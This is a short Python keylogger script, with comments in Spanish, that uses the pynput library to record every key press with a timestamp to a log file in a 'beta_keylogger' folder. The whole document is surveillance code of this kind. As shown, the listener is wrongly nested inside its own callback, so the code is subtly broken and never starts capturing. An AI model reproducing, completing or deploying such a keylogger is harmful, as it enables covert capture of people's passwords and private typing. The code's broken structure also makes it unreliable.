from pynput.keyboard import Key, Listener
import logging

# cambiar path dependiendo del SO
log_dir = r"/Users/marcosplazagonzalez/Desktop/beta_keylogger/logs/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# evento
def on_press(key):
	logging.info(str(key))
	with Listener(on_press=on_press) as listener:
		listener.join()